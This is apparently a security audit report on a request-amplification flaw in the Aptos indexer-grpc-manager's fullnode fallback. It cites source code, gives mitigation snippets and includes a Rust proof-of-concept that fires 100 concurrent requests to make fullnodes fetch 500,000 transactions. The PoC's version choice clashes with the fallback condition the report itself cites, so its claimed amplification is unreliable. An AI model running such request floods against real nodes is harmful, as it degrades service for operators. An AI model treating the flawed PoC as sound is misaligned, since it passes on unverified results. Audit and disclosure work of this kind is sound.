# Audit Report

## Title
Request Amplification Vulnerability in Indexer gRPC Manager Fullnode Fallback

## Summary
The `DataManager::get_transactions()` function in the indexer-grpc-manager contains an unprotected fallback mechanism that can amplify client requests by up to 5000x when the cache is lagging. Multiple concurrent requests for lagging data can overwhelm fullnode resources without any rate limiting, request deduplication, or backpressure mechanisms.

## Finding Description

The vulnerability exists in the indexer-grpc-manager service, which acts as a caching proxy layer between indexer clients and fullnodes. When configured with `allow_fn_fallback=true`, the service includes a fallback mechanism to fetch data directly from fullnodes when the cache doesn't contain requested data. [1](#0-0) 

The critical issue is that each client request that meets the fallback conditions independently triggers a fullnode request for exactly 5000 transactions, regardless of how much data the client actually needs. This creates a request amplification attack vector.

The fallback is triggered when three conditions are met: [2](#0-1) 

The `lagging()` function considers the cache lagging when it's more than 20,000 versions behind: [3](#0-2) 

The public gRPC endpoint has no rate limiting: [4](#0-3) 

**Attack Scenario:**

1. Attacker identifies when the cache is lagging (>20,000 versions behind the known latest)
2. Attacker sends 100 concurrent gRPC requests for different versions in the "lagging but not in cache" window
3. Each request independently triggers a fullnode request for 5000 transactions
4. Total amplification: 100 requests â†’ 500,000 transactions fetched from fullnodes
5. Each fullnode request spawns processing tasks that fetch from storage, convert transactions, and encode protobuf data [5](#0-4) 

The fullnode processes each request by spawning a coordinator that creates multiple parallel storage fetch tasks: [6](#0-5) 

**Broken Invariant:**
This violates the "Resource Limits" invariant: "All operations must respect gas, storage, and computational limits." The lack of rate limiting and the hardcoded 5000 transaction count allow uncontrolled resource consumption on fullnodes.

## Impact Explanation

This qualifies as **Medium Severity** under the Aptos bug bounty criteria:

The vulnerability can cause significant resource exhaustion on fullnodes serving indexer data:
- **Storage I/O amplification**: Each amplified request triggers database reads for 5000 transactions
- **CPU amplification**: Transaction conversion and protobuf encoding for 500,000+ transactions
- **Memory amplification**: Multiple concurrent streams holding transaction data in memory
- **Network amplification**: Large data transfers back to the manager

While this primarily affects indexer infrastructure rather than consensus validators, it can degrade the availability of fullnodes that also serve state sync data to validators. The impact is limited because:
- Only affects fullnodes with indexer-grpc service enabled
- Requires `allow_fn_fallback=true` configuration
- Does not directly impact consensus or validator operations
- Does not cause permanent state corruption

However, sustained exploitation could lead to "API crashes" (High Severity category) if fullnode resources are exhausted.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack is likely to occur because:
- **Low barrier to entry**: Any gRPC client can exploit this without authentication beyond network access
- **Easy detection**: Attackers can monitor for cache lag conditions via public endpoints
- **Simple exploitation**: Standard gRPC clients with concurrent request capability are sufficient
- **No detection mechanism**: No logging or monitoring specifically tracks fallback request patterns

The likelihood is reduced by:
- **Configuration dependency**: Requires `allow_fn_fallback=true` to be enabled
- **Transient window**: Only exploitable when cache is lagging
- **Possible operational monitoring**: Operators may notice unusual fullnode load patterns

## Recommendation

Implement multiple protective mechanisms:

1. **Add per-client rate limiting** on the gRPC service layer:
```rust
// In service.rs, add rate limiter before calling data_manager
async fn get_transactions(
    &self,
    request: Request<GetTransactionsRequest>,
) -> Result<Response<TransactionsResponse>, Status> {
    // Check rate limit per client IP/identity
    self.rate_limiter.check_and_update(request.remote_addr())?;
    
    let request = request.into_inner();
    let transactions = self
        .data_manager
        .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
        .await
        .map_err(|e| Status::internal(format!("{e}")))?;
    // ... rest of implementation
}
```

2. **Add request deduplication/coalescing** for concurrent requests to the same version range:
```rust
// In data_manager.rs, maintain a map of in-flight fallback requests
struct DataManager {
    cache: RwLock<Cache>,
    file_store_reader: FileStoreReader,
    metadata_manager: Arc<MetadataManager>,
    allow_fn_fallback: bool,
    // Add: Track in-flight fullnode requests
    in_flight_requests: Arc<DashMap<u64, Arc<Mutex<Option<Vec<Transaction>>>>>>,
}
```

3. **Make transaction count configurable and dynamic** based on client request size:
```rust
let transactions_count = std::cmp::min(
    5000,
    (max_size_bytes_from_cache / AVG_TRANSACTION_SIZE).saturating_add(100)
);
let request = GetTransactionsFromNodeRequest {
    starting_version: Some(start_version),
    transactions_count: Some(transactions_count),
};
```

4. **Add global concurrency limits** for fullnode fallback requests:
```rust
// Use a semaphore to limit concurrent fallback requests
const MAX_CONCURRENT_FALLBACK_REQUESTS: usize = 10;
let fallback_semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_FALLBACK_REQUESTS));

// Acquire permit before making fallback request
let _permit = fallback_semaphore.acquire().await?;
```

5. **Add metrics and alerting** for fallback request patterns to detect abuse.

## Proof of Concept

```rust
// PoC: Concurrent request amplification test
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient, GetTransactionsRequest,
};
use futures::future::join_all;
use tonic::transport::Channel;

#[tokio::test]
async fn test_request_amplification() {
    // Connect to indexer-grpc-manager
    let channel = Channel::from_static("http://localhost:50051")
        .connect()
        .await
        .unwrap();
    let mut client = GrpcManagerClient::new(channel);

    // Determine cache state and find lagging window
    // Assuming cache is at version 100,000 and latest is 150,000
    let cache_version = 100_000;
    let target_start_version = cache_version - 10_000; // Request old data

    // Send 100 concurrent requests for different versions in the lag window
    let mut handles = vec![];
    for i in 0..100 {
        let mut client_clone = client.clone();
        let start_version = target_start_version + (i * 100);
        
        let handle = tokio::spawn(async move {
            let request = GetTransactionsRequest {
                starting_version: Some(start_version),
            };
            
            let start = std::time::Instant::now();
            let result = client_clone.get_transactions(request).await;
            let elapsed = start.elapsed();
            
            (result.is_ok(), elapsed)
        });
        
        handles.push(handle);
    }

    // Wait for all requests to complete
    let results = join_all(handles).await;
    
    // Each of these 100 requests will trigger a fullnode request for 5000 transactions
    // Total: 500,000 transactions fetched from fullnodes
    // This demonstrates the amplification factor
    
    let successful = results.iter().filter(|r| r.as_ref().unwrap().0).count();
    println!("Successfully completed {} requests", successful);
    println!("Each triggered a fullnode fetch of 5000 transactions");
    println!("Total amplification: {} transactions", successful * 5000);
}
```

## Notes

**Scope Clarification:**
This vulnerability affects the indexer-grpc infrastructure, which is separate from consensus but part of the Aptos Core codebase. While the security question specifically mentions this as "Medium" severity, the actual impact depends on deployment configuration and whether affected fullnodes also serve validators.

**Configuration Dependency:**
The vulnerability only exists when `allow_fn_fallback=true` is set. Operators should evaluate whether this fallback mechanism is necessary for their deployment, and if so, implement the recommended protections.

**Detection:**
Operators can detect exploitation by monitoring:
- Spike in fullnode request rates from the indexer-grpc-manager
- Increased storage I/O on fullnodes during cache lag periods
- Network traffic patterns showing 5000-transaction batches

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L284-287)
```rust
    pub(crate) fn lagging(&self, cache_next_version: u64) -> bool {
        // TODO(grao): Need a better way, we can use the information in the metadata_manager.
        cache_next_version + 20000 < self.metadata_manager.get_known_latest_version()
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/data_manager.rs (L299-307)
```rust
        if start_version >= cache_start_version {
            if start_version >= cache_next_version {
                // If lagging, try to fetch the data from FN.
                if self.lagging(cache_next_version) && self.allow_fn_fallback {
                    debug!("GrpcManager is lagging, getting data from FN, requested_version: {start_version}, cache_next_version: {cache_next_version}.");
                    let request = GetTransactionsFromNodeRequest {
                        starting_version: Some(start_version),
                        transactions_count: Some(5000),
                    };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L129-146)
```rust
    async fn get_transactions(
        &self,
        request: Request<GetTransactionsRequest>,
    ) -> Result<Response<TransactionsResponse>, Status> {
        let request = request.into_inner();
        let transactions = self
            .data_manager
            .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
            .await
            .map_err(|e| Status::internal(format!("{e}")))?;

        Ok(Response::new(TransactionsResponse {
            transactions,
            chain_id: Some(self.chain_id),
            // Not used.
            processed_range: None,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-88)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
        let processor_task_count = self.service_context.processor_task_count;
        let processor_batch_size = self.service_context.processor_batch_size;
        let output_batch_size = self.service_context.output_batch_size;
        let transaction_channel_size = self.service_context.transaction_channel_size;
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };

```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L101-108)
```rust
    pub async fn process_next_batch(&mut self) -> Vec<Result<EndVersion, Status>> {
        let fetching_start_time = std::time::Instant::now();
        // Stage 1: fetch transactions from storage.
        let sorted_transactions_from_storage_with_size =
            self.fetch_transactions_from_storage().await;
        if sorted_transactions_from_storage_with_size.is_empty() {
            return vec![];
        }
```
